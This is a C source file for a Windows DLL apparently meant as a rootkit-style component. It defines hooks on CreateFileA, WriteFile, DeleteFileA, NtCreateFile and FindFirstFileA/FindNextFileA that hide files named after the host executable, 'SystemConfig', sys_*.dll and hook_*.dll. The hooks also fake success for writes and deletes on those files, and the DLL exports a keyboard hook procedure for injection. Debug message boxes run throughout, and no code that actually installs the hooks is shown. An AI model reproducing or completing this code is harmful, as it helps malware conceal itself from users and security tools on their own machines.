#include <windows.h>
#include <string.h>
#include <winternl.h>
#include <stdio.h> // Added for snprintf

#define STATUS_OBJECT_NAME_NOT_FOUND ((LONG)0xC0000034L)

typedef HANDLE (WINAPI *CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *DeleteFileA_t)(LPCSTR);
typedef LONG (NTAPI *NtCreateFile_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef HANDLE (WINAPI *FindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *FindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA);

HMODULE hKernel32, hNtdll;
CreateFileA_t origCreateFileA;
WriteFile_t origWriteFile;
DeleteFileA_t origDeleteFileA;
NtCreateFile_t origNtCreateFile;
FindFirstFileA_t origFindFirstFileA;
FindNextFileA_t origFindNextFileA;
char exe_name[MAX_PATH];

__declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    char msg[256];
    snprintf(msg, sizeof(msg), "KeyboardProc called (nCode: %d, wParam: %lu)", nCode, wParam);
    MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL ShouldHideFile(const char *fileName) {
    // Hide files matching exe_name, hidden folders (starting with "."), SystemConfig, sys_*.dll, and hook_*.dll
    return (strstr(fileName, exe_name) ||
            fileName[0] == '.' ||
            strstr(fileName, "SystemConfig") ||
            (strstr(fileName, "sys_") && strstr(fileName, ".dll")) ||
            (strstr(fileName, "hook_") && strstr(fileName, ".dll")));
}

HANDLE WINAPI HookedCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    char msg[512];
    snprintf(msg, sizeof(msg), "HookedCreateFileA called for file: %s", lpFileName);
    MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
    if (ShouldHideFile(lpFileName)) {
        MessageBoxA(NULL, "Hiding file in HookedCreateFileA", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE;
    }
    return origCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

BOOL WINAPI HookedWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    char fileName[MAX_PATH];
    char msg[512];
    if (GetFinalPathNameByHandleA(hFile, fileName, MAX_PATH, 0) > 0) {
        snprintf(msg, sizeof(msg), "HookedWriteFile called for file: %s", fileName);
        MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        if (ShouldHideFile(fileName)) {
            MessageBoxA(NULL, "Hiding write operation in HookedWriteFile", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            *lpNumberOfBytesWritten = nNumberOfBytesToWrite;
            return TRUE;
        }
    } else {
        MessageBoxA(NULL, "HookedWriteFile: Failed to get file name", "Hook DLL Debug", MB_OK | MB_ICONWARNING);
    }
    return origWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

BOOL WINAPI HookedDeleteFileA(LPCSTR lpFileName) {
    char msg[512];
    snprintf(msg, sizeof(msg), "HookedDeleteFileA called for file: %s", lpFileName);
    MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
    if (ShouldHideFile(lpFileName)) {
        MessageBoxA(NULL, "Hiding delete operation in HookedDeleteFileA", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        return TRUE;
    }
    return origDeleteFileA(lpFileName);
}

LONG NTAPI HookedNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess,
    ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    char msg[512];
    if (ObjectAttributes != NULL && ObjectAttributes->ObjectName != NULL) {
        UNICODE_STRING *name = ObjectAttributes->ObjectName;
        char path[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, name->Buffer, name->Length / sizeof(WCHAR), path, MAX_PATH, NULL, NULL);
        path[name->Length / sizeof(WCHAR)] = '\0';
        snprintf(msg, sizeof(msg), "HookedNtCreateFile called for file: %s", path);
        MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        if (ShouldHideFile(path)) {
            MessageBoxA(NULL, "Hiding file in HookedNtCreateFile", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    } else {
        MessageBoxA(NULL, "HookedNtCreateFile: Invalid ObjectAttributes", "Hook DLL Debug", MB_OK | MB_ICONWARNING);
    }
    return origNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize,
        FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

HANDLE WINAPI HookedFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) {
    char msg[512];
    snprintf(msg, sizeof(msg), "HookedFindFirstFileA called for pattern: %s", lpFileName);
    MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
    HANDLE hFind = origFindFirstFileA(lpFileName, lpFindFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "HookedFindFirstFileA: No files found", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        return hFind;
    }

    while (ShouldHideFile(lpFindFileData->cFileName)) {
        snprintf(msg, sizeof(msg), "Hiding file in HookedFindFirstFileA: %s", lpFindFileData->cFileName);
        MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        if (!origFindNextFileA(hFind, lpFindFileData)) {
            FindClose(hFind);
            SetLastError(ERROR_FILE_NOT_FOUND);
            MessageBoxA(NULL, "HookedFindFirstFileA: No more files after hiding", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hFind;
}

BOOL WINAPI HookedFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) {
    char msg[512];
    MessageBoxA(NULL, "HookedFindNextFileA called", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
    BOOL result;
    do {
        result = origFindNextFileA(hFindFile, lpFindFileData);
        if (!result) {
            MessageBoxA(NULL, "HookedFindNextFileA: No more files", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            return result;
        }
        if (ShouldHideFile(lpFindFileData->cFileName)) {
            snprintf(msg, sizeof(msg), "Hiding file in HookedFindNextFileA: %s", lpFindFileData->cFileName);
            MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
        }
    } while (ShouldHideFile(lpFindFileData->cFileName));
    return result;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    char msg[256];
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            snprintf(msg, sizeof(msg), "hook.dll loaded in process (PID: %lu)", GetCurrentProcessId());
            MessageBoxA(NULL, msg, "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            // Get the executable name dynamically
            char bin_path[MAX_PATH];
            GetModuleFileNameA(NULL, bin_path, MAX_PATH);
            char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
            strncpy(exe_name, bin_name, MAX_PATH);
            exe_name[MAX_PATH - 1] = '\0';
            MessageBoxA(NULL, exe_name, "Executable Name Set", MB_OK | MB_ICONINFORMATION);

            hKernel32 = LoadLibraryA("kernel32.dll");
            if (!hKernel32) {
                MessageBoxA(NULL, "Failed to load kernel32.dll", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            hNtdll = LoadLibraryA("ntdll.dll");
            if (!hNtdll) {
                MessageBoxA(NULL, "Failed to load ntdll.dll", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origCreateFileA = (CreateFileA_t)GetProcAddress(hKernel32, "CreateFileA");
            if (!origCreateFileA) {
                MessageBoxA(NULL, "Failed to get CreateFileA address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origWriteFile = (WriteFile_t)GetProcAddress(hKernel32, "WriteFile");
            if (!origWriteFile) {
                MessageBoxA(NULL, "Failed to get WriteFile address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origDeleteFileA = (DeleteFileA_t)GetProcAddress(hKernel32, "DeleteFileA");
            if (!origDeleteFileA) {
                MessageBoxA(NULL, "Failed to get DeleteFileA address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origNtCreateFile = (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
            if (!origNtCreateFile) {
                MessageBoxA(NULL, "Failed to get NtCreateFile address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origFindFirstFileA = (FindFirstFileA_t)GetProcAddress(hKernel32, "FindFirstFileA");
            if (!origFindFirstFileA) {
                MessageBoxA(NULL, "Failed to get FindFirstFileA address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            origFindNextFileA = (FindNextFileA_t)GetProcAddress(hKernel32, "FindNextFileA");
            if (!origFindNextFileA) {
                MessageBoxA(NULL, "Failed to get FindNextFileA address", "Hook DLL Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            MessageBoxA(NULL, "All function pointers initialized successfully", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            break;
        case DLL_PROCESS_DETACH:
            MessageBoxA(NULL, "hook.dll unloaded from process", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            break;
        case DLL_THREAD_ATTACH:
            MessageBoxA(NULL, "hook.dll attached to thread", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            break;
        case DLL_THREAD_DETACH:
            MessageBoxA(NULL, "hook.dll detached from thread", "Hook DLL Debug", MB_OK | MB_ICONINFORMATION);
            break;
    }
    return TRUE;
}